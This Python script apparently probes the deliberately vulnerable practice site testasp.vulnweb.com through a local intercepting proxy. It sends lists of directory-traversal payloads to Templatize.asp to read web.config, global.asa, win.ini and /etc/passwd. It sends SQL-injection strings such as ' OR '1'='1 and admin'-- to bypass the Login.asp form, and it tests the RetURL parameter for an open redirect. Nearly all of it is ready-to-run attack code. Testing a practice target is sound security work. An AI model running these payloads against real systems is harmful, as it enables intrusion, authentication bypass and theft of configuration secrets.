#!/usr/bin/env python3
"""Round 4 — (1) Templatize.asp directory traversal, (2) Login.asp 인증 우회/RetURL 관찰."""
import subprocess, urllib.parse, hashlib, re

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]


def req(url, data=None, cookie=None, save=None):
    cmd = ["curl", "-s", "-i", "-m", "25"] + PROXY
    if cookie:
        cmd += ["-b", cookie, "-c", cookie]
    if data:
        cmd += ["-X", "POST", "--data", data]
    cmd += [url]
    p = subprocess.run(cmd, capture_output=True, text=True, errors="replace")
    raw = p.stdout
    status = raw.split("\n", 1)[0].strip()
    body = raw.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in raw else raw
    if save:
        open(save, "w", encoding="latin-1").write(body)
    return status, len(body), hashlib.sha256(body.encode()).hexdigest()[:10], body


print("=" * 90)
print("### 1. /Templatize.asp?item= — directory traversal")
# 기준: 정상 item
st, ln, h, b = req(f"{BASE}/Templatize.asp?item=html/about.html")
print(f"  baseline html/about.html            -> {st} len={ln} sha={h}")
base_len = ln

pays = [
    "html/about.html",                    # 기준
    "../web.config", "../../web.config", "../../../web.config",
    "..%2fweb.config", "%2e%2e%2fweb.config", "%2e%2e/%2e%2e/web.config",
    "..%5cweb.config", "..\\web.config", "....//web.config",
    "..%252fweb.config", "%2e%2e%252fweb.config",
    "html/../web.config", "html/../../web.config",
    "../global.asa", "../../global.asa",
    "../Templates/MainTemplate.dwt.asp",
    "../Default.asp", "../Login.asp",
    "../../../../../../../../windows/win.ini",
    "..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
    "C:\\Windows\\win.ini",
    "/etc/passwd", "../../../../etc/passwd",
    "%00/about.html", "html/about.html%00.txt",
    "../showforum.asp", "../styles.css",
]
for pay in pays:
    st, ln, h, b = req(f"{BASE}/Templatize.asp?item={urllib.parse.quote(pay, safe='')}")
    flag = ""
    if st.startswith("200") and "web.config" in pay.lower() and "configuration" in b.lower():
        flag = "  🎯 CONFIG LEAK"
    elif st.startswith("200") and ln not in (base_len,):
        flag = "  ⚠ unexpected 200"
    if "win.ini" in pay and "for 16-bit app support" in b:
        flag = "  🎯 WIN.INI LEAK"
    print(f"  {pay:42s} -> {st:30s} len={ln:6d}{flag}")

print()
print("=" * 90)
print("### 2. /Login.asp — 로그인 실패 기준선 + 인증 우회 시도")
ck = "/tmp/exploit/login.cookies"
req(f"{BASE}/Login.asp", cookie=ck)
st, ln, h, b = req(f"{BASE}/Login.asp", data="tfUName=__nosuchuser__&tfUPass=__wrongpw__", cookie=ck, save="/tmp/exploit/login_fail.html")
print(f"  [기준] 잘못된 자격증명              -> {st} len={ln} sha={h}")
m = re.findall(r"<div class='error'>(.*?)</div>|Invalid[^<]*|incorrect[^<]*|wrong[^<]*", b, re.I)
print(f"        실패 메시지 후보: {m[:3]}")

bypass = [
    "tfUName=' OR '1'='1&tfUPass=x",
    "tfUName=admin'--&tfUPass=x",
    "tfUName=' OR 1=1--&tfUPass=x",
    "tfUName=admin&tfUPass=' OR '1'='1",
    "tfUName=' OR '1'='1'--&tfUPass=x",
    "tfUName=admin' OR '1'='1&tfUPass=x",
    "tfUName=' OR 1=1 AND ''='&tfUPass=x",
    "tfUName=x' OR 'x'='x&tfUPass=x",
]
for d in bypass:
    st, ln, h2, b2 = req(f"{BASE}/Login.asp", data=d, cookie=ck)
    diff = "SAME-AS-FAIL" if h2 == h else f"DIFF({ln - ln:+d}B)" if False else "DIFF"
    mark = ""
    if "logout" in b2.lower() or "log out" in b2.lower():
        mark = "  🎯 로그아웃 링크 발견 → 인증 우회 성공"
    if "Invalid" not in b2 and h2 != h:
        mark += "  ⚠ 실패문구 없음"
    print(f"  {d:44s} -> {st:30s} len={ln:6d} {diff}{mark}")

print()
print("### 3. RetURL 반사/사용 여부")
for r_ in ["http://example.com", "//example.com", "%2F%2Fexample.com", "https://evil.example"]:
    st, ln, h3, b3 = req(f"{BASE}/Login.asp?RetURL={r_}", cookie=ck)
    hit = "RetURL 값이 본문에 등장" if urllib.parse.unquote(r_) in b3 else "본문에 없음(서버측에서만 사용되는 듯)"
    print(f"  RetURL={r_:24s} -> {st} len={ln}  {hit}")
